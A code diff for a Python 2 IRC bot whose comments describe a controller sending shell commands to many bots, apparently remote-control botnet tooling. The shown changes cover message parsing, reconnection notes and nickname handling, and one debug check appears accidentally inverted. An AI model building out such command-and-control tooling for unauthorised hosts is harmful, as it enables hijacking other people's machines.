@@ -8,6 +8,7 @@
 #implement public IP
 #make more cross-platform instead of just for linux
 #enable directive one liners
+#handle reconnecting if server restarts or there is some connection error
 
 import socket
 import ftplib
@@ -127,10 +128,6 @@ commands = {
 #MAYBE have syntax like this '??botname: interactive' or '??botname: commands'
 	#interactive would be the interactive shell while commands would be just listen to 
 #or just allow one liners to bots like 'botnick: command'
-#have a function that acts like this 'execute(system command)'
-	#to single out bots you could say 'botnick: execute(ls)'
-
-#allow controller to add/remove bots to list of those listening to interactive shell
 #allow controller to tell singular bots or all bots to return output of command or success/failure only
 
 #interactive shell details - 
@@ -142,31 +139,35 @@ commands = {
 
 #function which parses the command and determines how to handle it
 def parseCommand(command):
-	if DEBUG:
+	if not DEBUG:
 		print "command is '%s'" % command
 		print "interact 0: " + str(not INTERACT[0])
 		print "interact 1: " + str(not INTERACT[1])
 
 	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
-		header = command[(command.index(":") + 1):] #get all after colon
-		print "1header is: '%s'" % header
-		header = header[:header.index("PRIVMSG")]
-		print "2header is: '%s'" % header
-		lines = header.split(":")
+		lines = command.split("\n")
+		# print "numlines: '%d'" % len(lines)
 		if len(lines) > 2:
 			print "we got a bunch of lines...doing nothing"
 			return
-		elif len(lines) > 1:
-			header = lines[1] #get all after colon
 
-		print "3header is: '%s'" % header
+		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
+		print "1header is: '%s'" % header #print
+		if ":" in header: #check if there is a colon first, to avoid crashing
+			header = header[(header.index(":") + 1):] #get all after colon
+		print "2header is: '%s'" % header
+		# lines = header.split(":")
+		# elif len(lines) > 1:
+		# 	header = lines[1] #get all after colon
+
+		# print "3header is: '%s'" % header
 		user = header[:header.index("!~")] #user sending message
 		print "user is '%s'" % user
 		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
 		print "host is: '%s'" % host
 		hostname = host[:host.index("@")] #hostname: 'blarg'
 		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
-		
+
 		if DEBUG:
 			print "user is '%s'" % user
 			print "host is '%s'" % host
@@ -244,6 +245,9 @@ if DEBUG:
 counter = 2
 while "nickname already in use" in temp.lower():
 	botnick = botnick + "-" + str(counter)
+	if len(botnick) > 9: #if nick gets too long, generate new number and reset counter; try again
+		botnick = genNick(os)
+		counter = 2
 	irc.send("NICK " + botnick + "\n") #sets nick
 	temp=irc.recv(1024) #get response to setting nick
 	if DEBUG:
